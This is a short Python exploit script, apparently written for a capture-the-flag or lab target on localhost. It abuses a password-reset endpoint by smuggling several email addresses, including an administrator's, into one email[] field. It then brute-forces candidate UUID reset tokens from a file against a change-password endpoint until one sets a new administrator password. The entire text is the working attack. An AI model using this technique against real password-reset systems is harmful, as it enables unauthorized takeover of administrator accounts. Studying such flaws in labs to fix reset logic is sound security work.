import requests

# Function to send a POST request with a list of emails
def send_email_list(email_list):
    url = "http://localhost:9000/reset-password"
    files = {
        'email[]': (None, '\n'.join(email_list))
    }
    response = requests.post(url, files=files)
    print(response.text)

# Function to process each sublist of UUIDs
def check_uuid_list(uuid_list):
    for uuid in uuid_list:
        uuid = uuid.rstrip("\n")
        url = f"http://localhost:9000/change-password"
        response = requests.post(url, data={"password": "thisismynewpassword", "otp": uuid})
        print(f"Checking UUID: {uuid}")
        print(response)
        if "Invalid OTP format" not in response.text:
            print("ResetToken for administrator is: " + uuid)
            break

# Send emails to the server
email_list = ["myemail@gg.gg", "admin@proton.me", "myemail@gg.gg"]
send_email_list(email_list)

# Read the UUIDs from the file
with open("./uuids_list.txt", "r") as f:
    uuids = f.readlines()

# Loop through the UUIDs and execute check_uuid_list
check_uuid_list(uuids)
